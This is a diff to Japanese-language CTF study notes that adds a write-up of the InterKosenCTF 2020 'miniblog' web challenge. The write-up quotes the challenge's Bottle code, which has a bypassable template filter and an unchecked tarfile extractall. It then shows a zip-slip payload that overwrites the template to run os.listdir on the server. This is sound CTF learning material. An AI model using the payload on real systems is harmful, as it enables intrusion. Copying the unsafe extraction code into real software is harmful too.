@@ -1248,16 +1248,97 @@ def door(door):
 - **Payload**    
 書かれてるやつがどれもJinja2の環境で動いてない…理解不足…   
 
-## sample
+## bottle / zip slip in tarFile (InterKosenCTF 2020 miniblog) 
+https://ark4rk.hatenablog.com/entry/2020/09/07/004439#web-miniblog   
+https://hackmd.io/@ptr-yudai/HylUWdLlD   
+https://qiita.com/kusano_k/items/f0774d1fd0aa0ee8f72f   
 - **entrypoint**    
+blogが作成できるWebページがあって、テンプレートも変更できるようになっている。しかし、`{{}}`や`%`が使えないように制限されているため普通にSSTIできない。   
+画像ファイルなどをアップロードするのにtarファイルにしてからそれをサーバー上で解凍しているので、zip slipによってtemplateを上書きすれば、SSTIのフィルタリング無しでtempalteを上書きできる。   
 - **概要**    
+以下の`/update`では正規表現`r"{{!?[a-zA-Z0-9_]+}}"`によってSSTIができない。   
+```python
+@route("/update", method="POST")
+def do_update_template():
+    username = get_username()
+    if not username:
+        return abort(400)
+
+    content = request.forms.get("content")
+    if not content:
+        return abort(400)
+
+    if "%" in content:
+        return abort(400, "forbidden")
+
+    for brace in re.findall(r"{{.*?}}", content):
+        if not re.match(r"{{!?[a-zA-Z0-9_]+}}", brace):
+            return abort(400, "forbidden")
+
+    template_path = "userdir/{userid}/template".format(userid=users[username]["id"])
+    with open(template_path, "w") as f:
+        f.write(content)
+
+    redirect("/")
+```
+`tarpath`にあるtarファイルを`attachments_dir`に解凍するときに、解凍するときのファイル目が`../template`なら、`attachments_dir`より上のディレクトリのtemplateに上書きできる！   
+このZip Slipという脆弱性がPythonのtar関係のライブラリにもあるが直ってないらしい…   
+https://bugs.python.org/issue21109   
+zip slipについて   
+https://cililog.hatenablog.com/entry/2018/09/02/183220   
+```python
+@route("/upload", method="POST")
+def do_upload():
+    username = get_username()
+    if not username:
+        return abort(400)
+
+    attachment = request.files.get("attachment")
+    if not attachment:
+        return abort(400)
+
+    tarpath = 'tmp/{}'.format(uuid4().hex)
+    attachments_dir = "userdir/{userid}/attachments/".format(userid=users[username]["id"])
+    attachment.save(tarpath)
+    try:
+        tarfile.open(tarpath).extractall(path=attachments_dir)
+    except (ValueError, RuntimeError):
+        pass
+    os.remove(tarpath)
+    redirect("/")
+```
+https://alamot.github.io/path_traversal_archiver/   
+このツールを使ってパストラバーラルファイル名をtarファイルに簡単に埋め込むことができる。   
 - **Payload**    
+```txt
+// 以下のtemplateというファイルを作成する
+<%
+    import os
+
+    n = 5
+    xs = []
+    for i in range(n):
+        xs.append(os.listdir(("../" * i) + "."))
+    end
+%>
+% for x in xs:
+{{x}}<br>
+% end
+
+// 以下で細工したtar.gzファイルを作成してアップロードすると"ls ../"が実行できる
+$ python path_traversal_archiver.py template xxx.tar.gz -l 1
+```
 
 ## sample
 - **entrypoint**    
 - **概要**    
 - **Payload**    
 
+## Docker環境があるやつ(復習用)
+### The Usual Suspects (csictf 2020)
+https://github.com/csivitu/ctf-challenges/tree/master/web/The%20Usual%20Suspects   
+### miniblog (InterKosenCTF 2020)
+https://github.com/theoremoon/InterKosenCTF2020-challenges/tree/master/web/miniblog   
 
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
